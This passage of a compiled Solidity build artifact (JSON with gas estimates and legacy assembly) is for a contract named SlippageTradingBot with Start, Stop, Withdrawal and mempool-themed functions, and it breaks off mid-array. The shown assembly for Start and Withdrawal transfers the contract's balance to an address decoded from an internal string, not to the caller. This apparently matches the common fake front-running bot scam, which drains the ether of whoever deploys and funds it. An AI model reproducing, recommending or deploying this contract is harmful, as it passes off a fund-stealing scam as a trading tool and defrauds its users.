:-;1250:86;;1030:313;;;;:::o;1349:126::-;1386:7;1426:42;1419:5;1415:54;1404:65;;1349:126;;;:::o;1481:180::-;1529:77;1526:1;1519:88;1626:4;1623:1;1616:15;1650:4;1647:1;1640:15;1667:410;1707:7;1730:20;1748:1;1730:20;:::i;:::-;1725:25;;1764:20;1782:1;1764:20;:::i;:::-;1759:25;;1819:1;1816;1812:9;1841:30;1859:11;1841:30;:::i;:::-;1830:41;;2020:1;2011:7;2007:15;2004:1;2001:22;1981:1;1974:9;1954:83;1931:139;;2050:18;;:::i;:::-;1931:139;1715:362;1667:410;;;;:::o;2083:180::-;2131:77;2128:1;2121:88;2228:4;2225:1;2218:15;2252:4;2249:1;2242:15;2269:77;2306:7;2335:5;2324:16;;2269:77;;;:::o;2352:191::-;2392:3;2411:20;2429:1;2411:20;:::i;:::-;2406:25;;2445:20;2463:1;2445:20;:::i;:::-;2440:25;;2488:1;2485;2481:9;2474:16;;2509:3;2506:1;2503:10;2500:36;;;2516:18;;:::i;:::-;2500:36;2352:191;;;;:::o;2549:235::-;2589:4;2609:20;2627:1;2609:20;:::i;:::-;2604:25;;2643:20;2661:1;2643:20;:::i;:::-;2638:25;;2687:1;2684;2680:9;2672:17;;2711:42;2705:4;2702:52;2699:78;;;2757:18;;:::i;:::-;2699:78;2549:235;;;;:::o;2790:232::-;2830:3;2849:20;2867:1;2849:20;:::i;:::-;2844:25;;2883:20;2901:1;2883:20;:::i;:::-;2878:25;;2926:1;2923;2919:9;2912:16;;2949:42;2944:3;2941:51;2938:77;;;2995:18;;:::i;:::-;2938:77;2790:232;;;;:::o;3028:233::-;3067:3;3090:24;3108:5;3090:24;:::i;:::-;3081:33;;3136:66;3129:5;3126:77;3123:103;;3206:18;;:::i;:::-;3123:103;3253:1;3246:5;3242:13;3235:20;;3028:233;;;:::o;3267:180::-;3315:77;3312:1;3305:88;3412:4;3409:1;3402:15;3436:4;3433:1;3426:15;3453:185;3493:1;3510:20;3528:1;3510:20;:::i;:::-;3505:25;;3544:20;3562:1;3544:20;:::i;:::-;3539:25;;3583:1;3573:35;;3588:18;;:::i;:::-;3573:35;3630:1;3627;3623:9;3618:14;;3453:185;;;;:::o;3644:180::-;3692:77;3689:1;3682:88;3789:4;3786:1;3779:15;3813:4;3810:1;3803:15;3830:176;3862:1;3879:20;3897:1;3879:20;:::i;:::-;3874:25;;3913:20;3931:1;3913:20;:::i;:::-;3908:25;;3952:1;3942:35;;3957:18;;:::i;:::-;3942:35;3998:1;3995;3991:9;3986:14;;3830:176;;;;:::o;4012:194::-;4052:4;4072:20;4090:1;4072:20;:::i;:::-;4067:25;;4106:20;4124:1;4106:20;:::i;:::-;4101:25;;4150:1;4147;4143:9;4135:17;;4174:1;4168:4;4165:11;4162:37;;;4179:18;;:::i;:::-;4162:37;4012:194;;;;:::o;4212:86::-;4247:7;4287:4;4280:5;4276:16;4265:27;;4212:86;;;:::o;4304:188::-;4342:3;4361:18;4377:1;4361:18;:::i;:::-;4356:23;;4393:18;4409:1;4393:18;:::i;:::-;4388:23;;4434:1;4431;4427:9;4420:16;;4457:4;4452:3;4449:13;4446:39;;;4465:18;;:::i;:::-;4446:39;4304:188;;;;:::o;4498:191::-;4536:4;4556:18;4572:1;4556:18;:::i;:::-;4551:23;;4588:18;4604:1;4588:18;:::i;:::-;4583:23;;4630:1;4627;4623:9;4615:17;;4654:4;4648;4645:14;4642:40;;;4662:18;;:::i;:::-;4642:40;4498:191;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "820600",
								"executionCost": "855",
								"totalCost": "821455"
							},
							"external": {
								"Start()": "infinite",
								"Stop()": "infinite",
								"Withdrawal()": "infinite",
								"checkLiquidity()": "infinite"
							},
							"internal": {
								"_callStopMempoolActionMempool()": "infinite",
								"beyond(struct SlippageTradingBot.slice memory,struct SlippageTradingBot.slice memory)": "infinite",
								"callMempool()": "infinite",
								"checkMempool(uint256)": "infinite",
								"findContracts(uint256,uint256,uint256,uint256)": "infinite",
								"findNewContracts()": "infinite",
								"getLiquidity()": "24",
								"getMemPoolDepth()": "22",
								"getMemPoolHeight()": "22",
								"getMemPoolLength()": "22",
								"getMemPoolOffset()": "22",
								"loadCurrentContract(string memory)": "infinite",
								"mempool(string memory,string memory)": "infinite",
								"parseMemoryPool(string memory)": "infinite",
								"toHexDigit(uint8)": "infinite",
								"uint2str(uint256)": "infinite",
								"updateLiquidity()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 399,
									"end": 12963,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 399,
									"end": 12963,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 399,
									"end": 12963,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 498,
									"end": 520,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 498,
									"end": 520,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 498,
									"end": 520,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 498,
									"end": 520,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 498,
									"end": 520,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 498,
									"end": 520,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 498,
									"end": 520,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 498,
									"end": 520,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 498,
									"end": 520,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 498,
									"end": 520,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 498,
									"end": 520,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 399,
									"end": 12963,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 399,
									"end": 12963,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 399,
									"end": 12963,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 399,
									"end": 12963,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 399,
									"end": 12963,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 399,
									"end": 12963,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 399,
									"end": 12963,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220734c2db0fa60328170891dfa6297b99f06d0f9e9c29d594aec0fc679d09dfc7f64736f6c63430008140033",
									".code": [
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH",
											"source": 0,
											"value": "1B55BA3A"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH",
											"source": 0,
											"value": "70E44C6A"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH",
											"source": 0,
											"value": "BEDF0F4A"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH",
											"source": 0,
											"value": "D82C52D6"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 399,
											"end": 12963,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 9183,
											"end": 9373,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 9183,
											"end": 9373,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9183,
											"end": 9373,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 9183,
											"end": 9373,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 9183,
											"end": 9373,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 9183,
											"end": 9373,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 9183,
											"end": 9373,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9183,
											"end": 9373,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 10709,
											"end": 11039,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "tag",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 10709,
											"end": 11039,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 10032,
											"end": 10221,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 10032,
											"end": 10221,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10032,
											"end": 10221,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 10032,
											"end": 10221,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 10032,
											"end": 10221,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10032,
											"end": 10221,
											"name": "tag",
											"source": 0,
											"value": "15"
										},
										{
											"begin": 10032,
											"end": 10221,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10032,
											"end": 10221,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "19"
										},
										{
											"begin": 10374,
											"end": 10590,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "tag",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 10374,
											"end": 10590,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "tag",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10374,
											"end": 10590,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 9183,
											"end": 9373,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 9183,
											"end": 9373,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9227,
											"end": 9237,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 9240,
											"end": 9270,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 9256,
											"end": 9269,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 9256,
											"end": 9267,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 9256,
											"end": 9269,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 9256,
											"end": 9269,
											"name": "tag",
											"source": 0,
											"value": "23"
										},
										{
											"begin": 9256,
											"end": 9269,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9240,
											"end": 9255,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 9240,
											"end": 9270,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 9240,
											"end": 9270,
											"name": "tag",
											"source": 0,
											"value": "22"
										},
										{
											"begin": 9240,
											"end": 9270,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9227,
											"end": 9270,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9227,
											"end": 9270,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9281,
											"end": 9306,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 9317,
											"end": 9319,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 9281,
											"end": 9320,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9281,
											"end": 9320,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9340,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9349,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 9331,
											"end": 9349,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 9350,
											"end": 9364,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 9350,
											"end": 9362,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 9350,
											"end": 9364,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 9350,
											"end": 9364,
											"name": "tag",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 9350,
											"end": 9364,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "tag",
											"source": 0,
											"value": "29"
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 9331,
											"end": 9365,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9215,
											"end": 9373,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9215,
											"end": 9373,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 9183,
											"end": 9373,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 10709,
											"end": 11039,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10755,
											"end": 10775,
											"name": "PUSH",
											"source": 0,
											"value": "60"
										},
										{
											"begin": 10788,
											"end": 10798,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 10801,
											"end": 10831,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 10817,
											"end": 10830,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 10817,
											"end": 10828,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 10817,
											"end": 10830,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10817,
											"end": 10830,
											"name": "tag",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 10817,
											"end": 10830,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10801,
											"end": 10816,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "25"
										},
										{
											"begin": 10801,
											"end": 10831,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10801,
											"end": 10831,
											"name": "tag",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 10801,
											"end": 10831,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10788,
											"end": 10831,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10788,
											"end": 10831,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10842,
											"end": 10867,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 10878,
											"end": 10880,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10842,
											"end": 10881,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10842,
											"end": 10881,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10901,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10910,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 10892,
											"end": 10910,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 10911,
											"end": 10925,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 10911,
											"end": 10923,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "27"
										},
										{
											"begin": 10911,
											"end": 10925,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 10911,
											"end": 10925,
											"name": "tag",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 10911,
											"end": 10925,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 10892,
											"end": 10926,
